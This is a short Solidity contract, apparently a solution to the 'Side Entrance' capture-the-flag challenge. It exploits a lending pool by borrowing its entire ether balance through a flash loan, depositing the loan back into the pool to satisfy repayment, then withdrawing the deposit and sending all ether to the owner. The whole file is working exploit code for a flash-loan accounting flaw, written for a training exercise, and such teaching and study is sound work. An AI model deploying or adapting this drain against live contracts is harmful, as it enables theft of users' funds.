// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";


contract SideEntranceExploiter is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public sidePool;
    address public _owner;
    constructor(address _SideEntranceLenderPool){
        sidePool = SideEntranceLenderPool(_SideEntranceLenderPool);
        _owner = msg.sender;
    }

//address(sideEntranceLenderPool).balance
    function initiateFlashLoan() external {
        require(msg.sender == _owner, 'only owner can call');
        sidePool.flashLoan(address(sidePool).balance);
        sidePool.withdraw();
        (bool succ, )= payable(_owner).call{value:address(this).balance}("");
        require(succ, "withdraw failed");
    }
    function execute() external payable override {
        sidePool.deposit{value:msg.value}();
    }

    // need to receive ether
    receive() external payable {}    
}